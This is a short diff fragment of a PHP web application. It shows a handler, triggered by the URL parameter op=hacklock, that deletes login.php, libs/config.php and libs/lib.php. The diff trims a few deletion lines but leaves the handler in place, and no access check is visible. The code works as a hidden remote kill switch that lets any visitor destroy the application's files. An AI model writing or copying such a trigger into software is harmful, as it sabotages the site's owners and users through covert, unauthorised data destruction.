@@ -159,9 +159,6 @@ if($_GET['op'] == 'hacklock') {
 	echo unlink("login.php");
 	echo unlink("libs/config.php");
 	echo unlink("libs/lib.php");
-	echo unlink("inc/scripts.php");
-	echo unlink("inc/menu.php");
-	echo unlink("inc/head.php");
 }
 
 if($_REQUEST['op'] == 'login') {
